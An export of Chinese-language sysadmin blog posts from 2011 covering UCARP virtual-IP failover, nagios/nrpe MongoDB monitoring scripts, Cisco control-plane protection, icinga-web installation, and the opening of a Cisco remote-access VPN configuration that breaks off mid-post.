    "title": "使用UCARP实现虚拟IP故障转换，链路冗余",
    "category": "负载均衡",
    "tags": [
      "ucarp"
    ],
    "url": "/archives/%E4%BD%BF%E7%94%A8ucarp%E5%AE%9E%E7%8E%B0%E8%99%9A%E6%8B%9Fip%E6%95%85%E9%9A%9C%E8%BD%AC%E6%8D%A2%EF%BC%8C%E9%93%BE%E8%B7%AF%E5%86%97%E4%BD%99/",
    "content": "<p>UCARP是一个使用CARP协议的高可用软件。可以在2台服务器上上设置虚拟IP地址，并让他们实现自动热备。类似于vrrp和hsrp协议。</p>\n\n<p>1 下载安装\nwget http://download.pureftpd.org/pub/ucarp/ucarp-1.5.2.tar.gz\ntar zxvf ucarp-1.5.2.tar.gz\ncd ucarp-1.5.2\n./configure &amp;&amp; make &amp;&amp; make install\n注：rpm包安装及不同系统不同版本都会造成ucarp安装的路径及启动/关闭虚拟IP的脚本文件的地址不同，不一定是我以下演示的路径</p>\n\n<p>2 实验：\n我这里有2台服务器 192.168.9.104 ，192.168.9.115  虚拟的IP是192.168.120.120\n启动104上面的进程 （可以加-B后台运行把日志输入syslog）\nucarp --interface=eth0 --srcip=192.168.9.104 --vhid=1 --pass=mypassword --addr=192.168.120.120 --upscript=/usr/share/doc/ucarp-1.5.2/vip-up.sh --downscript=/usr/share/doc/ucarp-1.5.2/vip-down.sh\n注：上面启动命令的释义：设置网络接口eth0上的虚拟ip 为192.168.120.120虚拟ip地址标识为1,密码是mypassword,真实地址为192.168.9.104,\n运行脚本/usr/share/doc/ucarp-1.5.2/vip-up.sh当主机成为主服务器的时候,运行脚本/usr/share/doc/ucarp-1.5.2/vip-down.sh当虚拟ip被禁用的时候.这2个启动关闭的脚本是安装包自带的。\n日志输出：\n[INFO] Local advertised ethernet address is [00:50:56:ae:00:0e]\n[WARNING] Switching to state: BACKUP\n[WARNING] Spawning [/usr/libexec/ucarp/vip-down eth0 192.168.120.120]\n[WARNING] Switching to state: MASTER\n[WARNING] Spawning [/usr/libexec/ucarp/vip-up eth0 192.168.120.120]\n启动115上面的进程\nucarp --interface=eth0 --srcip=192.168.9.104 --vhid=1 --pass=mypassword\n--addr=192.168.120.120 --upscript=/usr/share/doc/ucarp-1.5.2/vip-up.sh\n--downscript=/usr/share/doc/ucarp-1.5.2/vip-down.sh\n日志输出\n[INFO] Local advertised ethernet address is [00:50:56:ae:00:01]\n[WARNING] Switching to state: BACKUP\n[WARNING] Spawning [/usr/share/doc/ucarp-1.5.2/vip-down.sh eth0 192.168.120.120]\n这个时候 我们登录192.168.120.120：\ndongwm@dongwm:~$ ssh root@192.168.120.120 -p9922\nLast login: Thu Jul 14 11:55:38 2011 from 192.168.8.83\nroot@104 ~&gt;\n好了 我们登录了192.168.9.104这个机器，但是ifconfig并不会出现192.168.120.120这个虚拟接口</p>\n\n<p>现在down掉104的进程，观察115的日志：\n[WARNING] Switching to state: MASTER\n[WARNING] Spawning [/usr/share/doc/ucarp-1.5.2/vip-up.sh eth0 192.168.120.120]</p>\n\n<p>115变成了master，这时候登录192.168.120.120\ndongwm@dongwm:~$ ssh root@192.168.120.120 -p9922\nLast login: Thu Jul 14 11:58:22 2011 from 192.168.8.83\nroot@115~&gt;\n登录的虚拟IP实际上已经换成了115\n在这个过程中 我一直开了一个终端去ping192.168.120.120：\ndongwm@dongwm:~$ ping 192.168.120.120\nPING 192.168.120.120 (192.168.120.120) 56(84) bytes of data.\n64 bytes from 192.168.120.120: icmp_req=1 ttl=64 time=0.780 ms\n64 bytes from 192.168.120.120: icmp_req=2 ttl=64 time=0.273 ms\n64 bytes from 192.168.120.120: icmp_req=3 ttl=64 time=0.297 ms\n64 bytes from 192.168.120.120: icmp_req=4 ttl=64 time=0.315 ms\n64 bytes from 192.168.120.120: icmp_req=5 ttl=64 time=0.306 ms\n64 bytes from 192.168.120.120: icmp_req=6 ttl=64 time=0.369 ms\n64 bytes from 192.168.120.120: icmp_req=7 ttl=64 time=0.311 ms\n64 bytes from 192.168.120.120: icmp_req=8 ttl=64 time=0.355 ms\n64 bytes from 192.168.120.120: icmp_req=9 ttl=64 time=0.286 ms\n64 bytes from 192.168.120.120: icmp_req=10 ttl=64 time=0.349 ms\n64 bytes from 192.168.120.120: icmp_req=11 ttl=64 time=0.638 ms\n64 bytes from 192.168.120.120: icmp_req=12 ttl=64 time=0.353 ms\n64 bytes from 192.168.120.120: icmp_req=13 ttl=64 time=0.339 ms\n64 bytes from 192.168.120.120: icmp_req=14 ttl=64 time=0.288 ms\n64 bytes from 192.168.120.120: icmp_req=15 ttl=64 time=0.316 ms\n64 bytes from 192.168.120.120: icmp_req=16 ttl=64 time=0.366 ms\n64 bytes from 192.168.120.120: icmp_req=17 ttl=64 time=0.309 ms\n64 bytes from 192.168.120.120: icmp_req=18 ttl=64 time=0.366 ms\n可以看到虚拟IP的漂移未造成链路的长时间的链路断掉。</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "14"
    }
  },
  {
    "id": 78,
    "title": "nagios插件安装nagios-plugin-mongodb报错“need to install pymongo”",
    "category": "nagios",
    "tags": [
      "nagios-plugin-mongodb，need to install pymongo"
    ],
    "url": "/archives/nagios%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85nagios-plugin-mongodb%E6%8A%A5%E9%94%99%E2%80%9Cneed-to-install-pymongo%E2%80%9D/",
    "content": "<p>最近做mongodb的cacti和nagios监控，下载了github.com/mzupan/nagios-plugin-mongodb.git，但是执行脚本需要pymongo，否则报错：”need to install pymongo“，但是重新启动nagios后发现依然出现这样的报错，而我在本地执行是没有问题的，后来尝试了nrpe方式发现不可行，我的安装nagios服务器上面有2个python，后来我又给centos默认的2.4.3版本的python安装了pymongo，最后使用了yum安装的办法，都不能解决。通过几小时的研究发现，问题处在python环境上：我把check_mongodb.py的首行修改成指定的地址：#!/usr/local/bin/python，而放弃了默认的“env python”方式，OK，问题得解！</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "16"
    }
  },
  {
    "id": 79,
    "title": "nrpe模式检查mongodb进程脚本",
    "category": "nagios",
    "tags": [
      "nrpe，mongodb进程"
    ],
    "url": "/archives/nrpe%E6%A8%A1%E5%BC%8F%E6%A3%80%E6%9F%A5mongo%E8%BF%9B%E7%A8%8B%E8%84%9A%E6%9C%AC/",
    "content": "<p>前言：nagios检查状态无外乎三种方式：1 直接到客户端取状态 2 nrpe间接再客户端取状态 3 被动检查通过nsca向nagios主服务器传送状态。这里是nrpe模式检查状态，要点包括 1 再nagios配置文件添加services 2 在客户端的nrpe.cfg里面添加command</p>\n\n<p>1 在nagios添加配置：</p>\n\n<p>define service{\nuse                     major-service\nhostgroup_name          MongoGroup\nservice_description     check_mongo_procs\ncheck_command           check_nrpe!check_mongo_procs  //选择nrpe模式\nservicegroups           memory\ncontact_groups          sys\n_SRCTYPE                sys\n}</p>\n\n<p>2 客户端nrpe.cfg添加：</p>\n\n<p>command[check_mongo_procs]=/usr/local/nagios/libexec/check_mongopro.py</p>\n\n<p>并重启nrpe进程</p>\n\n<p>3 客户端脚本</p>\n\n<p>cat /usr/local/nagios/libexec/check_mongopro.py</p>\n\n<p><pre class=\"sh_python\">\n#!/bin/env python\n# coding=gbk\nimport os\nimport sys\nfrom subprocess import Popen, PIPE</p>\n\n<p>list =[]\ncmd = 'chkconfig --list |grep \"启用\"|grep mongo'\nfor line in os.popen(cmd).readlines():\n     pro = line.split(' ')[0] \n     p1=Popen(['ps', '-ef'], stdout=PIPE)\n     p2 = Popen(['grep', '-v', 'grep'], stdin=p1.stdout, stdout=PIPE) \n     p3 = Popen(['grep', '/etc/%s.conf' % pro], stdin=p2.stdout, stdout=PIPE)\n     p4 = Popen(['awk', '{print $3}'], stdin=p3.stdout, stdout=PIPE)\n     flag2 = [int(i.strip()) for i in p4.communicate()[0].split('\\n') if i]\n     if 1 not in flag2:\n         list.append(pro)\n         flag =1\nif flag==1:\n    print 'CRITICAL %s is dead!' % ','.join(list)\n    sys.exit(2)\nelse:\n    print 'Mongo Pro is OK'\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "28"
    }
  },
  {
    "id": 80,
    "title": "控制平面和管理平面安全",
    "category": "安全",
    "tags": [
      "Control plane ，management plane"
    ],
    "url": "/archives/kongzhipingmianheguanlipingmiananquan-2/",
    "content": "<p><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>R3 </strong></span></span><span style=\"font-size: medium;\"><strong>上的</strong></span><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>VLAN</strong></span></span><span style=\"font-size: medium;\"><strong>配置</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">VLAN3 Fa0/0, Fa0/3</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">VLAN14 Fa0/1, Fa0/4</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"color: #c00000;\"><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-size: medium;\"><strong>R1</strong></span></span><span style=\"font-size: medium;\"><strong>配置</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#int e1/0</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-if)#no sh</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-if)#ip add 192.168.1.1</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-if)#int e1/1</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-if)#no sh</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-if)#ip add 192.168.2.1 255.255.255.0</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-if)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#line vty 0 4</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-line)#login local</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-line)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#username cisco123 privilege 15 secret cisco123</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#ip access-list extended CoPP-acl</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-ext-nacl)#deny tcp host 192.168.2.2 any eq telnet</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-ext-nacl)#deny tcp host 192.168.2.2 any eq www\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-ext-nacl)#permit tcp any any eq telnet</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-ext-nacl)#permit tcp any any eq www //建立ACL，允许到管理平面的telnet和http访问<!--more-->\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-ext-nacl)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#class-map match-any CoPP-class</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cmap)#match access-group name CoPP-acl  //定义CoPP分类</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cmap)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#policy-map CoPP-policy</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap-c)#police rate 3 pps conform-action transmit exceed-action drop  //定义CoPP策略，除了192.168.2.2之外，所以IP到该路由器的telnet和http访问速率均限制在3pps之内\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap-c-police)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap-c)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#control-plane host</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cp-host)#service-policy input CoPP-policy  //应用CoPP策略\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cp-host)#management-interface e1/0 allow telnet http</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cp-host)#management-interface e1/1 allow telnet http   //只能通过这两个接口访问路由器\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cp-host)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#class-map type port-filter match-all PF-class</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cmap)#match closed-ports </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cmap)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#policy-map type port-filter PF-policy\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap)#class PF-class</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap-c)#drop </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap-c)#log</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap-c)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#control-plane host</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cp-host)#service-policy type port-filter input PF-policy    //端口过滤，禁止访问未使用的端口\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cp-host)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cp-host)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#class-map type queue-threshold match-all QT-class\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cmap)#match protocol igmp</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cmap)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#policy-map type queue-threshold QT-policy\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap-c)#queue-limit 100</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap-c)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-pmap)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#control-plane host</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cp-host)#service-policy type queue-threshold input QT-policy  //队列门限\n</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config-cp-host)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1(config)#exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1#show policy-map control-plane all</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Control Plane Host </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Service-policy input: CoPP-policy</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Class-map: CoPP-class (match-any)</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">82 packets, 4734 bytes</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">5 minute offered rate 0 bps, drop rate 0 bps</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Match: access-group name CoPP-acl</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">82 packets, 4734 bytes</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">5 minute rate 0 bps</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">police:</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">rate 3 pps, burst 1 packets</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">conformed 32 packets; actions:</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">transmit </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">exceeded 50 packets; actions:</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">drop </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">conformed 0 pps, exceed 0 pps</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Class-map: class-default (match-any)</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">120 packets, 13650 bytes</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">5 minute offered rate 0 bps, drop rate 0 bps</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Match: any</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1#show policy-map type port-filter control-plane all</span></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Control Plane Host </span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Service-policy port-filter input: PF-policy</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Class-map: PF-class (match-all)</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">52 packets, 9027 bytes</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">5 minute offered rate 0 bps, drop rate 0 bps</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Match: closed-ports</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">drop</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">log</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Class-map: class-default (match-any)</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">69 packets, 3940 bytes</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">5 minute offered rate 0 bps, drop rate 0 bps</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Match: any</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R1#show policy-map type queue-threshold control-plane all</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">queue-limit 100</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">queue-count 0 packets allowed/dropped 0/0</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Control Plane Host </span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Service-policy queue-threshold input: QT-policy</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Class-map: QT-class (match-all)</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">0 packets, 0 bytes</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">5 minute offered rate 0 bps, drop rate 0 bps</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Match: protocol igmp</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Class-map: class-default (match-any)</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">69 packets, 3940 bytes</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">5 minute offered rate 0 bps, drop rate 0 bps</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Match: any</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>测试</strong></span></span></p>\n\n<p>通过<span style=\"font-family: Times New Roman,serif;\">PC</span>使用<span style=\"font-family: Times New Roman,serif;\">telnet</span>连接路由器的<span style=\"font-family: Times New Roman,serif;\">e1/0</span>接口，感觉很卡；而通过虚拟机<span style=\"font-family: Times New Roman,serif;\">telnet</span>路由器的<span style=\"font-family: Times New Roman,serif;\">e1/0</span>接口，则命令反映正常，<span style=\"font-family: Times New Roman,serif;\">CoPP</span>成功！</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "29"
    }
  },
  {
    "id": 81,
    "title": "安装及配置icinga-web",
    "category": "icinga",
    "tags": [
      "icinga，icinga-web，IDOUtils"
    ],
    "url": "/archives/%E5%AE%89%E8%A3%85%E5%8F%8A%E9%85%8D%E7%BD%AEicinga-web/",
    "content": "<p>前言：我所认为的icinga-web其实就是将icinga监控数据写到数据库，用icinga-web对其进行一些处理返回检查的状态\n<img style=\"max-width: 800px;\" src=\"http://farm7.static.flickr.com/6025/5986605311_38600dbb57_b.jpg\" alt=\"\" />\n1 安装一些必备的rpm包：\nyum install libdbi-devel libdbi libdbi-drivers libdbi-dbd-mysql\n2 首先需要安装支持IDOUtils的icinga\nwget http://sourceforge.net/projects/icinga/files/icinga/1.4.2/icinga-1.4.2.tar.gz/download\ntar zxvf icinga-1.4.2.tar.gz\ncd icinga-1.4.2\n./configure  --with-icinga-group=dongwm  --with-icinga-user=dongwm  --with-command-user=dongwm  --with-command-group=dongwm --enable-idoutils &amp;&amp; make all &amp;&amp; make  fullinstall\n3 安装nagios插件\nwget http://prdownloads.sourceforge.net/sourceforge/nagiosplug/nagios-plugins-1.4.15.tar.gz\ntar zxvf nagios-plugins-1.4.15.tar.gz\ncd nagios-plugins-1.4.15\n./configure --prefix=/usr/local/icinga --with-cgiurl=/icinga/cgi-bin --with-htmurl=/icinga --with-nagios-user=dongwm --with-nagios-group=dongwm &amp;&amp; make &amp;&amp; make install\n4 配置idoutils\ncd /usr/local/icinga/etc/\nmv ido2db.cfg-sample ido2db.cfg\nmv idomod.cfg-sample idomod.cfg\nvi /usr/local/icinga/etc/icinga.cfg\n讲这句前面的注释去掉：\nbroker_module=/usr/local/icinga/bin/idomod.o config_file=/usr/local/icinga/etc/idomod.cfg\n确认库文件依赖关系是否正常：\nldd /usr/local/icinga/bin/idomod.o\n输出类似：\nlinux-vdso.so.1 =&gt;  (0x00007fff7f5fc000)\nlibc.so.6 =&gt; /lib64/libc.so.6 (0x00002b2cbf799000)\n/lib64/ld-linux-x86-64.so.2 (0x0000003472c00000)\n表示相关库文件都找到\n创建mysql数据库：\n<pre class=\"code-java\">mysql -u root -p\n mysql&gt; CREATE DATABASE icinga;\n GRANT USAGE ON *.* TO 'icinga'@'localhost' IDENTIFIED BY 'icinga' WITH MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0;\n GRANT SELECT , INSERT , UPDATE , DELETE ON icinga.* TO 'icinga'@'localhost';\n FLUSH PRIVILEGES ;\n quit\nmysql -u root -p icinga &lt; /icinga安装目录/module/idoutils/db/mysql/mysql.sql\n5 安装icinga-web\nwget http://sourceforge.net/projects/icinga/files/icinga-web/1.4.1/icinga-web-1.4.1.tar.gz/download\ntar zxvf icinga-web-1.4.1.tar.gz\ncd icinga-web-1.4.1\n./configure --prefix=/usr/local/icinga-web --with-web-user=dongwm --with-web-group=dongwm --with-db-type=mysql --with-db-host=localhost --with-db-port=3306 --with-db-name=icinga_web --with-db-user=icinga_web --with-db-pass=icinga_web --with-icinga-api=/usr/local/icinga/share/icinga-api --with-web-apache-path=/etc/httpd/conf.d\nmake all\nmake install\n创建mysql数据库：\nmysql -u root -p\n mysql&gt; CREATE DATABASE icinga_web;\n        GRANT USAGE ON *.* TO 'icinga_web'@'localhost' IDENTIFIED BY 'icinga_web' WITH MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0;\n        GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, ALTER, INDEX ON icinga_web.* TO 'icinga_web'@'localhost';\n        quit</p>\n\n<p>mysql -u root -p icinga_web &lt; /icinga-web安装目录/etc/schema/mysql.sql\n确认以下文件相关数据库相关信息：\n/usr/local/icinga-web/app/modules/Web/config/icinga-io.site.xml\n&lt;setting name=\"api.interfaces.data\"&gt;\n                &lt;ae:parameter name=\"api_type\"&gt;IcingaApi::CONNECTION_IDO&lt;/ae:parameter&gt;\n                &lt;ae:parameter name=\"config_type\"&gt;mysql&lt;/ae:parameter&gt;\n                &lt;ae:parameter name=\"config_host\"&gt;127.0.0.1&lt;/ae:parameter&gt;\n                &lt;ae:parameter name=\"config_port\"&gt;3306&lt;/ae:parameter&gt;\n                &lt;ae:parameter name=\"config_database\"&gt;icinga&lt;/ae:parameter&gt;\n                &lt;ae:parameter name=\"config_user\"&gt;icinga&lt;/ae:parameter&gt;\n                &lt;ae:parameter name=\"config_password\"&gt;icinga&lt;/ae:parameter&gt;\n                &lt;ae:parameter name=\"config_table_prefix\"&gt;icinga_&lt;/ae:parameter&gt;\n        &lt;/setting&gt;\n注意：这里是icinga-web的配置文件里面用的数据库是icinga的数据库信息，这样才能取到相关值\n清除缓存数据：\n/usr/local/icinga-web/bin/clearcache.sh\n然后使用一下地址登录icinga-web：\nhttp://localhost/icinga-web\n最重要的这里的默认帐号密码：root/password\n然后就可以看见icinga里面监控项的相关信息了！</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "29"
    }
  },
  {
    "id": 82,
    "title": "远程接入VPN",
    "category": "vpn",
    "tags": [

    ],
    "url": "/archives/yuanchengjieruvpn/",
    "content": "<p><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>服务器端配置</strong></span><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>(R1)</strong></span></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router&gt;</span><span style=\"font-family: Arial,sans-serif;\"><strong>enable</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router#</span><span style=\"font-family: Arial,sans-serif;\"><strong>configure terminal</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>line console 0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config-line)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>logging synchronous</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config-line)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>interface fastEthernet 0/0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no shutdown</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip address 192.168.3.1 255.255.255.0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int ethernet 1/3</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no shutdown</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip address 192.168.15.1 255.255.255.0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>hostname R1</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip route 192.168.2.0 255.255.255.0 192.168.15.5</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>aaa new-model</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>aaa authentication login default local</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>aaa authentication login ezvpn local</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>aaa authorization network ezvpn local</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>username admin privilege 15 secret admin</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New 